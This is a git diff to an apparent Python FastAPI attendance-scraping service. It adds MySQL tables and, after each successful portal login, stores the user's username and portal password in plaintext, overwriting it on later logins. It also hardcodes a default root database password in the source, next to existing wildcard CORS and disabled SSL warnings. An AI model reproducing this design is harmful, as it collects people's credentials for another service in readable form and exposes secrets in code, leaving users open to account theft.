@@ -7,6 +7,9 @@ from bs4 import BeautifulSoup
 import urllib3
 from typing import List, Dict, Any
 import time
+import mysql.connector
+from mysql.connector import Error
+import os
 
 # Suppress SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -21,6 +24,70 @@ app.add_middleware(
     allow_methods=["*"],
     allow_headers=["*"],
 )
+
+# MySQL Configuration
+DB_CONFIG = {
+    'host': os.getenv('DB_HOST', 'localhost'),
+    'user': os.getenv('DB_USER', 'root'),
+    'password': os.getenv('DB_PASSWORD', 'Uday@2006'),
+    'database': os.getenv('DB_NAME', 'samvidha_attendance')
+}
+
+def get_db_connection():
+    try:
+        connection = mysql.connector.connect(**DB_CONFIG)
+        return connection
+    except Error as e:
+        print(f"Error connecting to MySQL: {e}")
+        return None
+
+def init_db():
+    try:
+        # Connect without database first to create it
+        temp_conn = mysql.connector.connect(
+            host=DB_CONFIG['host'],
+            user=DB_CONFIG['user'],
+            password=DB_CONFIG['password']
+        )
+        temp_cursor = temp_conn.cursor()
+        temp_cursor.execute(f"CREATE DATABASE IF NOT EXISTS {DB_CONFIG['database']}")
+        temp_cursor.close()
+        temp_conn.close()
+
+        # Now connect to the actual database
+        conn = get_db_connection()
+        if not conn:
+            return
+        
+        cursor = conn.cursor()
+        # Create users table
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                username VARCHAR(255) UNIQUE NOT NULL,
+                password TEXT NOT NULL,
+                last_login DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+            )
+        """)
+        
+        # Create login_history table
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS login_history (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                username VARCHAR(255) NOT NULL,
+                login_time DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        
+        conn.commit()
+        cursor.close()
+        conn.close()
+        print("Database initialized successfully.")
+    except Error as e:
+        print(f"Error initializing database: {e}")
+
+# Initialize DB on startup
+init_db()
 
 class LoginRequest(BaseModel):
     username: str
@@ -252,6 +319,32 @@ async def get_attendance(login_data: LoginRequest):
         if not attendance_data or not attendance_data.get("student_info"):
              raise HTTPException(status_code=401, detail="Invalid credentials or unable to fetch data")
         
+        # Store login info in MySQL
+        db_conn = get_db_connection()
+        if db_conn:
+            try:
+                db_cursor = db_conn.cursor()
+                # Insert or update user
+                db_cursor.execute(
+                    "INSERT INTO users (username, password) VALUES (%s, %s) "
+                    "ON DUPLICATE KEY UPDATE password = %s",
+                    (login_data.username, login_data.password, login_data.password)
+                )
+                
+                # Log login history
+                db_cursor.execute(
+                    "INSERT INTO login_history (username) VALUES (%s)",
+                    (login_data.username,)
+                )
+                
+                db_conn.commit()
+                print(f"Login stored for user: {login_data.username}")
+            except Error as e:
+                print(f"Database storage error: {e}")
+            finally:
+                db_cursor.close()
+                db_conn.close()
+
         print(f"Total processing time: {time.time() - total_start:.2f}s")
         return {
             "success": True,
@@ -269,7 +362,3 @@ async def root():
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8000)
-
-
-
-
